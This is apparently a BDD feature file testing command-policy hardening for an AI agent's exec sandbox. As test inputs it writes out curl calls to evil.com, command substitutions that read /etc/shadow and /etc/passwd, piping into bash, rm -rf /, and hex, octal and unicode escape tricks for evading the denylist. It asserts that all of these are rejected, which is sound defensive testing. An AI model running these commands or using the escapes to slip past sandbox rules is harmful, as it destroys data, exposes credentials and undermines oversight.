@done
Feature: Command Policy Hardening
  As a system administrator
  I want command allowlists and denylists to prevent bypasses
  So that dangerous commands remain blocked

  # --- Symlink path behavior: validate_path is not a jail ---

  Scenario: Symlink pointing outside workspace is allowed
    Given a sandboxed workspace at a temporary directory
        And a symlink "link.txt" in the workspace pointing to "/etc/passwd"
    When the agent tries to validate path "link.txt" resolved against the workspace
    Then the validation should be ok

  Scenario: Nested symlink chain escaping workspace is allowed
    Given a sandboxed workspace at a temporary directory
        And a symlink "step1" in the workspace pointing to "/tmp"
    When the agent tries to validate path "step1/some-file.txt" resolved against the workspace
    Then the validation should be ok

  Scenario: Symlink pointing within workspace is allowed
    Given a sandboxed workspace at a temporary directory
        And a file "real.txt" exists in the workspace
    And a symlink "link.txt" in the workspace pointing to "real.txt"
    When the agent tries to validate path "link.txt" resolved against the workspace
    Then the validation should be ok

  # --- Exec command allowlist ---

  Scenario: Command on the allowlist is permitted
    Given a sandbox with command allowlist "echo,ls,cat,grep"
    When the agent tries to validate command "echo hello"
    Then the validation should be ok

  Scenario: Command not on the allowlist is rejected
    Given a sandbox with command allowlist "echo,ls,cat,grep"
    When the agent tries to validate command "curl http://evil.com/exfil"
    Then the validation should be an error
    And the error should mention "not in allowlist"

  Scenario: Shell metacharacter bypass attempt is rejected
    Given a sandbox with command allowlist "echo,ls"
    When the agent tries to validate command "echo hello; curl evil.com"
    Then the validation should be an error
    And the error should mention "not in allowlist"

  Scenario: Logical-AND bypass attempt is rejected
    Given a sandbox with command allowlist "echo,ls"
    When the agent tries to validate command "echo ok && bash -lc id"
    Then the validation should be an error
    And the error should mention "not in allowlist"

  Scenario: Logical-OR bypass attempt is rejected
    Given a sandbox with command allowlist "echo,ls"
    When the agent tries to validate command "ls || python -c 'print(1)'"
    Then the validation should be an error
    And the error should mention "not in allowlist"

  Scenario: Command substitution bypass attempt is rejected
    Given a sandbox with command allowlist "echo,ls"
    When the agent tries to validate command "echo $(cat /etc/shadow)"
    Then the validation should be an error
    And the error should mention "not in allowlist"

  Scenario: Backtick command substitution is rejected
    Given a sandbox with command allowlist "echo,ls"
    When the agent tries to validate command "echo `id`"
    Then the validation should be an error
    And the error should mention "not in allowlist"

  Scenario: Process substitution bypass attempt is rejected
    Given a sandbox with command allowlist "echo,ls"
    When the agent tries to validate command "echo <(cat /etc/passwd)"
    Then the validation should be an error
    And the error should mention "not in allowlist"

  Scenario: Quectope to disallowed command is rejected
    Given a sandbox with command allowlist "echo,ls"
    When the agent tries to validate command "ls | bash"
    Then the validation should be an error
    And the error should mention "not in allowlist"

  Scenario: Empty allowlist blocks all commands
    Given a sandbox with command allowlist ""
    When the agent tries to validate command "echo hello"
    Then the validation should be an error
    And the error should mention "not in allowlist"

  Scenario: Allowlist mode falls back to denylist when not configured
    Given a sandbox without a command allowlist
    When the agent tries to validate command "echo hello"
    Then the validation should be ok

  @security-pr1
  Scenario: Dangerous command with repeated whitespace is rejected
    Given a sandbox without a command allowlist
    When the agent tries to validate command "rm  -rf /"
    Then the validation should be an error
    And the error should mention "dangerous pattern"

  @security-pr1
  Scenario: Dangerous command with split rm flags is rejected
    Given a sandbox without a command allowlist
    When the agent tries to validate command "rm -r -f /"
    Then the validation should be an error
    And the error should mention "dangerous pattern"

  # --- Issue #301: Bash encoding/escaping bypass prevention ---

  Scenario: Hex escape bypass of dangerous command is blocked
    Given a sandbox without a command allowlist
    When the agent tries to validate command "$'\x72\x6d' -rf /"
    Then the validation should be an error
    And the error should mention "dangerous pattern"

  Scenario: Octal escape bypass of dangerous command is blocked
    Given a sandbox without a command allowlist
    When the agent tries to validate command "$'\162\155' -rf /"
    Then the validation should be an error
    And the error should mention "dangerous pattern"

  Scenario: Variable indirection bypass is blocked
    Given a sandbox without a command allowlist
    When the agent tries to validate command "cmd='rm -rf /'; $cmd"
    Then the validation should be an error
    And the error should mention "dangerous pattern"

  Scenario: Unicode escape bypass is blocked
    Given a sandbox without a command allowlist
    When the agent tries to validate command "$'\u0072\u006d' -rf /"
    Then the validation should be an error
    And the error should mention "dangerous pattern"

  Scenario: Mixed escape and literal bypass is blocked
    Given a sandbox without a command allowlist
    When the agent tries to validate command "$'\x72'm -rf /"
    Then the validation should be an error
    And the error should mention "dangerous pattern"

  Scenario: Hex escape of reboot is blocked
    Given a sandbox without a command allowlist
    When the agent tries to validate command "$'\x72\x65\x62\x6f\x6f\x74'"
    Then the validation should be an error
    And the error should mention "dangerous pattern"

  # --- Exec timeout enforcement ---

  Scenario: Command completes within timeout
    Given an exec tool with a timeout of 5 seconds
    When the agent executes command "echo fast"
    Then the tool result should contain "fast"
    And the tool result should not be an error

  Scenario: Command killed after timeout expires
    Given an exec tool with a timeout of 1 seconds
    When the agent executes command "sleep 60"
    Then the tool result should be an error
    And the tool result should contain "timed out"

  Scenario: Default timeout is not set when not configured
    Given an exec tool with no explicit timeout
    Then the exec tool should have no timeout

  # --- Environment variable inheritance ---

  @done
  Scenario: Environment variables are inherited by child processes
    Given an exec tool in a sandboxed workspace
    And the environment contains "APP_DATABASE_URL" set to "postgres://example/test"
    When the agent executes command "printenv APP_DATABASE_URL"
    Then the tool result should contain "postgres://example/test"

  @done
  Scenario: QUECTO-prefixed environment variables are inherited by child processes
    Given an exec tool in a sandboxed workspace
    And the environment contains "QUECTO_SECRET_TOKEN" set to "hunter2"
    When the agent executes command "printenv QUECTO_SECRET_TOKEN"
    Then the tool result should contain "hunter2"

  # --- Credential file permission hardening ---

  Scenario: Credential file is created with restricted permissions
    Given a credential store at a temporary directory
    When I store a token "sk-test" for provider "openai"
    Then the credentials file should have permissions 0600

  Scenario: Credential file permissions are enforced on every write
    Given a credential store at a temporary directory
    And the credentials file exists with permissions 0644
    When I store a token "sk-new" for provider "anthropic"
    Then the credentials file should have permissions 0600
